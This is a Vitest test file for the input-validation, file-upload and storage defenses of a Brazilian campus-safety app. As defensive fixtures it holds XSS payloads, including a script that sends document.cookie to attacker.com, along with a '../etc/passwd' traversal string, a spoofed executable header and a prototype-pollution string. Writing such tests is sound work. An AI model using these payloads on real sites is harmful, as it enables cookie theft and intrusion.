import { describe, it, expect, beforeEach } from 'vitest';
import {
  isValidCpf,
  maskCpf,
  GovBrAuthSchema,
  QrCodeInputSchema,
  LightRatingSchema,
  ReportSubmissionSchema,
  ChatMessageSchema,
  PersistedCampusStateSchema,
} from '../security/schemas';
import { validateEvidenceImage } from '../security/fileValidation';
import { loadCampusState, saveCampusState } from '../security/storage';
import { getSeedCampusState } from '../data/ufscTrindade';

describe('Security & DevSecOps Validation Layer', () => {
  describe('Zod Input Schemas & XSS Prevention', () => {
    it('rejects XSS vectors in ReportSubmissionSchema (<script>, <img>, javascript:)', () => {
      const maliciousReports = [
        {
          category: 'iluminacao',
          location: 'Entrada CCE',
          description: '<script>alert("pwned")</script>',
          isConfidential: true,
        },
        {
          category: 'assedio',
          location: '<img src=x onerror=alert(1)>',
          description: 'Relato legítimo mas com local malicioso',
          isConfidential: true,
        },
        {
          category: 'suspeito',
          location: 'Bosque',
          description: 'Acesse javascript:alert(document.cookie) para detalhes',
          isConfidential: false,
        },
        {
          category: 'manutencao',
          location: 'RU Central',
          description: 'data:text/html,<script>alert(1)</script>',
          isConfidential: true,
        },
      ];

      for (const payload of maliciousReports) {
        const result = ReportSubmissionSchema.safeParse(payload);
        expect(result.success).toBe(false);
      }
    });

    it('rejects XSS vectors in ChatMessageSchema', () => {
      const maliciousChat = [
        {
          senderId: 'usr-1',
          senderName: 'Pedro',
          text: '<script>fetch("https://attacker.com?c="+document.cookie)</script>',
        },
        {
          senderId: 'usr-2',
          senderName: '<script>alert(1)</script>',
          text: 'Oi, estou chegando perto do RU',
        },
        {
          senderId: 'usr-3',
          senderName: 'Ana',
          text: 'Clique aqui: javascript:alert(1)',
        },
      ];

      for (const msg of maliciousChat) {
        const result = ChatMessageSchema.safeParse(msg);
        expect(result.success).toBe(false);
      }
    });

    it('rejects oversized inputs (>500 chars report, >240 chars chat) and too short inputs', () => {
      const oversizedReport = {
        category: 'iluminacao',
        location: 'Biblioteca Universitária',
        description: 'A'.repeat(501),
        isConfidential: true,
      };
      expect(ReportSubmissionSchema.safeParse(oversizedReport).success).toBe(false);

      const tooShortReport = {
        category: 'iluminacao',
        location: 'BU',
        description: 'curto', // < 10 chars
        isConfidential: true,
      };
      expect(ReportSubmissionSchema.safeParse(tooShortReport).success).toBe(false);

      const oversizedChat = {
        senderId: 'usr-1',
        senderName: 'Carlos',
        text: 'C'.repeat(241),
      };
      expect(ChatMessageSchema.safeParse(oversizedChat).success).toBe(false);

      const emptyChat = {
        senderId: 'usr-1',
        senderName: 'Carlos',
        text: '   ',
      };
      expect(ChatMessageSchema.safeParse(emptyChat).success).toBe(false);
    });

    it('validates and rejects malformed QR codes (directory traversal, special chars)', () => {
      const malformedCodes = [
        '../etc/passwd',
        'POSTE-!@#$',
        'POSTE/CCE/01',
        '<script>alert(1)</script>',
        'POSTE',
        '',
      ];

      for (const code of malformedCodes) {
        expect(QrCodeInputSchema.safeParse(code).success).toBe(false);
        expect(QrCodeInputSchema.safeParse({ code }).success).toBe(false);
      }

      // Valid codes
      const validCodes = ['POSTE-BU-01', 'POSTE-RU-03', 'POSTE-BOSQUE-04'];
      for (const code of validCodes) {
        expect(QrCodeInputSchema.safeParse(code).success).toBe(true);
        expect(QrCodeInputSchema.safeParse({ code }).success).toBe(true);
      }
    });

    it('validates corridor light rating in [1..5] integer range', () => {
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 5 }).success).toBe(true);
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 1 }).success).toBe(true);
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 0 }).success).toBe(false);
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 6 }).success).toBe(false);
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 3.5 }).success).toBe(false);
    });
  });

  describe('CPF Validation & Masking', () => {
    it('rejects invalid Brazilian CPFs (repeated digits, bad check digits, invalid format)', () => {
      const invalidCpfs = [
        '111.111.111-11',
        '000.000.000-00',
        '22222222222',
        '123.456.789-00', // wrong check digits
        '12345678901', // wrong check digits
        '123456789', // 9 digits
        'abc.def.ghi-jk',
        '',
      ];

      for (const cpf of invalidCpfs) {
        expect(isValidCpf(cpf)).toBe(false);
      }
    });

    it('accepts valid Brazilian CPF and masks to ***.XXX.XXX-**', () => {
      // Valid check-digit CPF: 529.982.247-25
      const validCpf1 = '529.982.247-25';
      expect(isValidCpf(validCpf1)).toBe(true);
      expect(maskCpf(validCpf1)).toBe('***.982.247-**');

      // Valid check-digit CPF: 123.456.789-09
      const validCpf2 = '12345678909';
      expect(isValidCpf(validCpf2)).toBe(true);
      expect(maskCpf(validCpf2)).toBe('***.456.789-**');

      // GovBrAuthSchema validation
      const authPayload = {
        name: 'Mariana Silva',
        cpf: '529.982.247-25',
        affiliation: 'Estudante • Eng. Sanitária',
      };
      expect(GovBrAuthSchema.safeParse(authPayload).success).toBe(true);

      const invalidAuthPayload = {
        name: '<script>alert(1)</script>',
        cpf: '111.111.111-11',
        affiliation: 'Estudante',
      };
      expect(GovBrAuthSchema.safeParse(invalidAuthPayload).success).toBe(false);
    });
  });

  describe('File Validation (Magic Bytes & EXIF Stripping)', () => {
    it('rejects oversized files (> 5 MB)', async () => {
      // 5MB + 1 byte
      const oversizedBytes = new Uint8Array(5 * 1024 * 1024 + 1);
      // Valid JPEG header
      oversizedBytes[0] = 0xff;
      oversizedBytes[1] = 0xd8;
      oversizedBytes[2] = 0xff;

      const file = new File([oversizedBytes], 'photo.jpg', { type: 'image/jpeg' });
      const result = await validateEvidenceImage(file);
      expect(result.valid).toBe(false);
      expect(result.error).toMatch(/5MB/i);
    });

    it('rejects spoofed files (.exe disguised as .jpg via Magic Bytes check)', async () => {
      // DOS MZ header: 0x4D 0x5A
      const exeBytes = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
      const file = new File([exeBytes], 'malware.jpg', { type: 'image/jpeg' });

      const result = await validateEvidenceImage(file);
      expect(result.valid).toBe(false);
      expect(result.error).toMatch(/magic bytes|inválido/i);
    });

    it('rejects spoofed HTML/SVG disguised as .jpg', async () => {
      const htmlBytes = new TextEncoder().encode('<svg onload=alert(1)>');
      const file = new File([htmlBytes], 'evidence.jpg', { type: 'image/jpeg' });

      const result = await validateEvidenceImage(file);
      expect(result.valid).toBe(false);
      expect(result.error).toMatch(/magic bytes|inválido/i);
    });

    it('accepts valid JPEG, PNG and WEBP files with authentic Magic Bytes', async () => {
      // JPEG: FF D8 FF E0
      const jpegBytes = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);
      const jpegFile = new File([jpegBytes], 'valid.jpg', { type: 'image/jpeg' });
      const mockStrip = async (_f: File) => 'data:image/jpeg;base64,mockthumb';

      const jpegResult = await validateEvidenceImage(jpegFile, mockStrip);
      expect(jpegResult.valid).toBe(true);
      expect(jpegResult.mimeType).toBe('image/jpeg');
      expect(jpegResult.sanitizedDataUrl).toBe('data:image/jpeg;base64,mockthumb');

      // PNG: 89 50 4E 47 0D 0A 1A 0A
      const pngBytes = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      const pngFile = new File([pngBytes], 'valid.png', { type: 'image/png' });
      const pngResult = await validateEvidenceImage(pngFile, mockStrip);
      expect(pngResult.valid).toBe(true);
      expect(pngResult.mimeType).toBe('image/png');

      // WEBP: RIFF....WEBP (52 49 46 46 ... 57 45 42 50)
      const webpBytes = new Uint8Array([
        0x52, 0x49, 0x46, 0x46, // RIFF
        0x24, 0x00, 0x00, 0x00, // length
        0x57, 0x45, 0x42, 0x50, // WEBP
        0x56, 0x50, 0x38, 0x20, // VP8
      ]);
      const webpFile = new File([webpBytes], 'valid.webp', { type: 'image/webp' });
      const webpResult = await validateEvidenceImage(webpFile, mockStrip);
      expect(webpResult.valid).toBe(true);
      expect(webpResult.mimeType).toBe('image/webp');
    });
  });

  describe('Storage Resilience & Prototype Pollution Defense', () => {
    let mockStorage: Storage;
    let storageMap: Map<string, string>;

    beforeEach(() => {
      storageMap = new Map();
      mockStorage = {
        length: 0,
        clear: () => storageMap.clear(),
        getItem: (k: string) => storageMap.get(k) ?? null,
        setItem: (k: string, v: string) => {
          storageMap.set(k, v);
        },
        removeItem: (k: string) => {
          storageMap.delete(k);
        },
        key: (i: number) => Array.from(storageMap.keys())[i] ?? null,
      };
    });

    it('safely returns seed state when localStorage contains malformed JSON', () => {
      mockStorage.setItem('rua_escura_campus_state_v1', '{invalid-json-data');
      const state = loadCampusState(mockStorage);
      expect(state).toBeDefined();
      expect(state.posts.length).toBe(8);
      expect(state.selectedBuildings.length).toBeGreaterThan(0);
    });

    it('safely returns seed state when localStorage contains invalid schema shape', () => {
      mockStorage.setItem(
        'rua_escura_campus_state_v1',
        JSON.stringify({ unexpectedKey: 'corrupted', version: 'not-a-number' })
      );
      const state = loadCampusState(mockStorage);
      expect(state).toBeDefined();
      expect(state.posts.length).toBe(8);
    });

    it('safely rejects prototype pollution attempts in localStorage', () => {
      mockStorage.setItem(
        'rua_escura_campus_state_v1',
        '{"__proto__": {"isAdmin": true}, "version": 1}'
      );
      const state = loadCampusState(mockStorage);
      expect(state).toBeDefined();
      expect((Object.prototype as Record<string, unknown>).isAdmin).toBeUndefined();
    });

    it('successfully saves and loads valid campus state', () => {
      const seed = getSeedCampusState();
      expect(PersistedCampusStateSchema.safeParse(seed).success).toBe(true);
      seed.onboardingCompleted = true;
      seed.isNightMap = true;

      const saveSuccess = saveCampusState(seed, mockStorage);
      expect(saveSuccess).toBe(true);

      const loaded = loadCampusState(mockStorage);
      expect(loaded.onboardingCompleted).toBe(true);
      expect(loaded.isNightMap).toBe(true);
    });

    it('handles storage quota errors gracefully during save', () => {
      const quotaStorage: Storage = {
        ...mockStorage,
        setItem: () => {
          throw new Error('QuotaExceededError: DOM Exception 22');
        },
      };

      const seed = getSeedCampusState();
      const saveSuccess = saveCampusState(seed, quotaStorage);
      expect(saveSuccess).toBe(false); // Does not throw, returns false
    });
  });
});
